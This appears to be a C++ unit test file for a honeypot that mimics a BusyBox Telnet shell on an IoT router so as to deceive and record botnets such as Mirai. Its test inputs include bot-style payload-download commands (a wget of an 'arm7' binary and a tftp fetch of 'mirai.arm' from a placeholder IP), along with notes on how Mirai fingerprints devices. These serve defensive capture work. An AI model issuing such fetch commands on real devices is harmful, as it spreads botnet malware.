// The BusyBox persona: the command set a Telnet session gets, and the two
// shell details an IoT botnet fingerprints a device by, the prompt and the
// message an unknown command gives.

#include <arapuca/ssh/shell.hpp>
#include <arapuca/ssh/vfs.hpp>
#include <arapuca/telnet/busybox.hpp>

#include <gtest/gtest.h>

#include <string>

namespace {

using arapuca::ssh::Persona;
using arapuca::ssh::Shell;
using arapuca::ssh::ShellContext;

Shell make_shell() {
    static const auto kRegistry = arapuca::telnet::busybox_registry();
    ShellContext context;
    context.persona = Persona::Busybox;
    context.cwd = "/";
    context.hostname = "router";
    return {kRegistry, std::move(context)};
}

TEST(BusyboxShell, PromptIsBusyboxNotBash) {
    const Shell shell = make_shell();
    EXPECT_EQ(shell.prompt(), "/ # ");
}

TEST(BusyboxShell, UnknownCommandSaysNotFoundNotBash) {
    Shell shell = make_shell();
    const auto result = shell.execute("definitely-not-a-command");
    EXPECT_NE(result.output.find("not found"), std::string::npos);
    EXPECT_EQ(result.output.find("bash"), std::string::npos);
}

TEST(BusyboxShell, BusyboxAppletProbeIsTheMiraiFingerprint) {
    Shell shell = make_shell();
    // Mirai sends a random token and reads back "<token>: applet not found".
    const auto result = shell.execute("/bin/busybox ECCHI");
    EXPECT_NE(result.output.find("ECCHI: applet not found"), std::string::npos);
}

TEST(BusyboxShell, UnameReportsAnEmbeddedArm) {
    Shell shell = make_shell();
    const auto result = shell.execute("uname -a");
    EXPECT_NE(result.output.find("armv7l"), std::string::npos);
    EXPECT_EQ(result.output.find("Ubuntu"), std::string::npos);
}

TEST(BusyboxShell, WgetUrlIsCapturedForTheEngine) {
    Shell shell = make_shell();
    const auto result = shell.execute("wget http://203.0.113.9/arm7");
    ASSERT_EQ(result.urls.size(), 1U);
    EXPECT_EQ(result.urls.front(), "http://203.0.113.9/arm7");
}

TEST(BusyboxShell, TftpHostAndFileBecomeACaptureUrl) {
    Shell shell = make_shell();
    // tftp carries no scheme in its arguments; the handler builds the URL.
    const auto result = shell.execute("tftp -r mirai.arm -g 203.0.113.9");
    ASSERT_EQ(result.urls.size(), 1U);
    EXPECT_EQ(result.urls.front(), "tftp://203.0.113.9/mirai.arm");
}

TEST(BusyboxShell, ShellEscalationsDoNothingAndSucceed) {
    Shell shell = make_shell();
    // A bot tries these to drop into a shell; on a device already in one they
    // produce nothing and let the script carry on.
    for (const char* command : {"enable", "system", "shell"}) {
        const auto result = shell.execute(command);
        EXPECT_TRUE(result.output.empty()) << command;
        EXPECT_EQ(result.status, 0) << command;
        EXPECT_TRUE(result.unknown_commands.empty()) << command;
    }
}

TEST(BusyboxShell, BashPersonaIsUnchanged) {
    // The persona field defaults to Bash, and the SSH shell must keep its
    // user@host prompt and its "command not found".
    const auto registry = arapuca::ssh::CommandRegistry::standard();
    ShellContext context;
    context.username = "root";
    context.hostname = "srv-web-03";
    Shell shell(registry, std::move(context));
    EXPECT_EQ(shell.prompt(), "root@srv-web-03:~# ");
    const auto result = shell.execute("nope");
    EXPECT_NE(result.output.find("command not found"), std::string::npos);
}

}  // namespace
